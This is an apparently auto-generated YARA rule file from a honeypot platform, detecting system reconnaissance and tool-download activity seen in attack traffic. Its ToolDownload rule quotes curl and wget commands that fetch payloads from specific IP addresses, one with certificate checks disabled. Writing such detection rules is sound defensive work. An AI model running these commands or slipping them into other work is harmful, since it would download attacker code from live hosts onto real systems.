// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260419_2149
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-19"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "6"
        unique_patterns = "1"
    strings:
        $s0 = "uname -a" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-19"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "4"
        unique_patterns = "4"
    strings:
        $s0 = "curl -sk https://46.151.182.82/sh" ascii nocase
        $s1 = "curl -O 61.184.10.103/gg" ascii nocase
        $s2 = "wget --no-check-certificate -qO- https://46.151.182.82/sh" ascii nocase
        $s3 = "curl -O 61.184.10.103/syss" ascii nocase
    condition:
        any of them
}